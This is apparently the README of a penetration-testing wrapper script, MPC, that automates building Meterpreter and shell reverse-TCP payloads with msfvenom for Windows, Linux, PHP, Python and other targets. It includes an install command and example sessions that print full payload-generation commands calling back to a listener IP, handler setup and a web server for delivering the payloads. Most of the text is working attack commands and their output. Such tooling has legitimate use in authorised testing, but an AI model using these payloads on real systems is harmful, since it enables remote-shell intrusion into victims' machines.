A **quick** way to generate various "basic" Meterpreter payloads via msfvenom (part of the Metasploit framework).

![Msfvenom Payload Creator (MPC)](https://i.imgur.com/HfNQ4pr.png)

- - -

## About

Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.

**Fully automating** msfvenom & Metasploit is the end goal _(well as to be be able to automate MPC itself)_.
The rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands** and a **quick web server** etc).

The only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).

_Note: This will **not** try to bypass any anti-virus solutions._

## Install

* Designed for **Kali Linux 1.1.0a+** & **Metasploit v4.11+** _(nothing else has been tested)_.

```
curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
chmod +x /usr/bin/mpc
mpc
```

## Help

``` bash
root@kali:~# mpc
 [*] Msfvenom Payload Creator (MPC v1.1)

 [i] ./mpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>)
 [i] <TYPE>: (All reverse TCP payloads)
 [i]   + ASP (meterpreter)
 [i]   + ASPX (meterpreter)
 [i]   + Bash [.sh] (shell)
 [i]   + Java [.jsp] (shell)
 [i]   + Linux [.elf] (meterpreter)
 [i]   + OSX [.macho] (shell)
 [i]   + Perl [.pl] (shell)
 [i]   + PHP (meterpreter)
 [i]   + Powershell [.ps1] (meterpreter)
 [i]   + Python [.py] (meterpreter)
 [i]   + Tomcat [.war] (shell)
 [i]   + Windows [.exe] (meterpreter)
 [i] Missing <DOMAIN/IP> will default to IP menu
 [i] Missing <PORT> will default to 443
root@kali:~#
```

## Example \#1 (Linux - Fully Automated With IP And Port)

```bash
root@kali:/var/www# bash mpc.sh linux 192.168.155.175 4444
 [*] Msfvenom Payload Creator (MPC v1.1)
 [i]   IP: 192.168.155.175
 [i] PORT: 4444
 [i] TYPE: linux (linux/x86/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.155.175 LPORT=4444 -o /root/linux-meterpreter.elf
 [i] linux meterpreter created: '/root/linux-meterpreter.elf'
 [i] MSF handler file: '/root/linux-meterpreter-elf.rc'   (msfconsole -q -r /root/linux-meterpreter-elf.rc)
 [?] Quick web server?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:/var/www#
```

## Example \#2 (Windows - Fully Automated With Interface)

```bash
root@kali:~# ./mpc.sh exe eth0
 [*] Msfvenom Payload Creator (MPC v1.1)
 [i]   IP: 192.168.103.241
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.103.241 LPORT=443 -o /root/windows-meterpreter.exe
 [i] windows meterpreter created: '/root/windows-meterpreter.exe'
 [i] MSF handler file: '/root/windows-meterpreter-exe.rc'   (msfconsole -q -r /root/windows-meterpreter-exe.rc)
 [?] Quick web server?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

## Example \#3 (PHP - Interactive)

```bash
root@kali:~# bash mpc.sh php
 [*] Msfvenom Payload Creator (MPC v1.1)

 [i] Use which interface/IP address?:
 [i]   1.) eth0 - 192.168.103.140
 [i]   2.) eth1 - 192.168.155.175
 [i]   3.) lo - 127.0.0.1
 [?] Select 1-3, interface or IP address: 2

 [i]   IP: 192.168.155.175
 [i] PORT: 443
 [i] TYPE: php (php/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST=192.168.155.175 LPORT=443 -o /root/php-meterpreter.php
 [i] php meterpreter created: '/root/php-meterpreter.php'
 [i] MSF handler file: '/root/php-meterpreter-php.rc'   (msfconsole -q -r /root/php-meterpreter-php.rc)
 [?] Quick web server?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

## To-Do List

* Cleaner command line arguments (e.g. `-ip 127.0.0.1`, `-v` etc)
* Display file stats (e.g. file, size, md5/sha1) _Commands are in, just commented out._
* Support different payloads (e.g. `standard shells`/`nc` & `reverse_http`/`reverse_https`, `bind` etc)
* x64 payloads
* _...IPv6 support?_
